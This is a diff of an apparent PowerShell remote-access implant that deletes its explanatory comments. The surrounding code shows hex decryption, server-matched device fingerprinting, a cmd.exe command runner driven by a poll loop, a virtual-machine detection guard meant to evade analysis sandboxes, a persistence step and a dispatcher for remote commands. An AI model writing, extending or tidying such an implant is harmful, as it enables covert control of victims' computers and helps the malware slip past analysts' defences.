@@ -262,8 +262,6 @@ function Decrypt-Hex([string]$hex, [string]$ks) {
 }
 
 # --- identity ---
-# this has to stay byte identical to generate_device_fingerprint_id() in
-# server.py: WIN_<ver><ARCH>[SERVER]_<BROWSER>SCR<w>x<h>_PLAT<plat>_MID<mid>
 
 $SW = 1920
 $SH = 1080
@@ -623,11 +621,6 @@ function Get-Info {
 }
 
 # --- command runner ---
-# cd/chdir/pwd handled natively so a shell keeps its cwd. everything else goes
-# through cmd.exe with the cwd forced. output goes to a temp file, not a
-# pipeline: a launched gui app inherits the stdout handle and a pipeline would
-# block on it until that app exits, freezing the poll loop. stdin is closed so a
-# nested cmd.exe gets EOF and returns instead of waiting.
 
 function Run-Cmd([string]$line) {
     if ([string]::IsNullOrEmpty($line)) { return '' }
@@ -699,9 +692,6 @@ if ($Test) {
 }
 
 # --- vm guard ---
-# any single hit is enough. fw/board strings catch every mainstream hypervisor,
-# the disk enum and guest tool processes catch a scrubbed smbios. runs once,
-# only when armed.
 
 function Test-VM {
     $hits = @()
@@ -841,8 +831,6 @@ Set-Persist
 Save-Cfg
 
 # --- dispatch ---
-# the server tags every command as "<cmd> (ID-XXXXXX)". the parens in the regex
-# are literal, not groups.
 
 function Invoke-Remote([string]$raw) {
     $t = $raw.Trim()
